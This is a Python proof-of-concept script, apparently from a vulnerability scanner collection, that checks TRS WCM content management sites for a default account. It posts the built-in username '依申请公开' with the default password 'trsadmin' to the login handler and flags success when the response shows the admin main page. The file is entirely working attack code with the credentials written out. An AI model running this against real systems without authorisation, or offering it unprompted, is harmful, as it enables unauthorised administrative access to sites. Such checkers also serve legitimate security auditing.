#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: TRS wcm系统默认账户漏洞
referer: unknown
author: Lucifer
description: TRS wcm系统中存在"依申请公开"这个默认用户,默认密码是trsadmin,可直接登录。
'''
import sys
import json
import requests
import warnings
from termcolor import cprint

class trs_wcm_default_user_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50", 
            "Content-Type":"application/x-www-form-urlencoded",
            "Referer":self.url+"/wcm/app/login.jsp"
        }
        payload = "/wcm/app/login_dowith.jsp"
        vulnurl = self.url + payload
        post_data = {
            "UserName":"依申请公开",
            "PassWord":"trsadmin"
        }
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"WCM IMPORTS BEGIN" in req.text and r"main.jsp" in req.text:
                cprint("[+]存在TRS wcm系统默认账户漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = trs_wcm_default_user_BaseVerify(sys.argv[1])
    testVuln.run()